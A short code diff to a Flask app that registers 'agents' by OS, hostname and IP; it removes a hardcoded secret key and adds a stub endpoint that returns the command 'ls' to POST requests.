@@ -12,8 +12,6 @@ load_dotenv()
 
 app = Flask(__name__)
 
-app.secret_key = "my precious"
-
 app.database = "agents.db"
 
 app.config.from_object(os.getenv('APP_SETTINGS'))
@@ -56,6 +54,16 @@ def agent_add():
         agent_dict = request.json
         add_agent(agent_dict['os'], agent_dict['host_name'], agent_dict['ip'], agent_dict['ram'])
     return redirect(url_for('home'))
+
+
+@app.route('/api/1.1/get_command', methods=['GET', 'POST'])
+def get_command():
+    print(request.method)
+    if request.method == 'POST':
+        return 'ls'
+    #     agent_dict = request.json
+    #     add_agent(agent_dict['os'], agent_dict['host_name'], agent_dict['ip'], agent_dict['ram'])
+    # return redirect(url_for('home'))
 
 
 @app.route('/welcome')
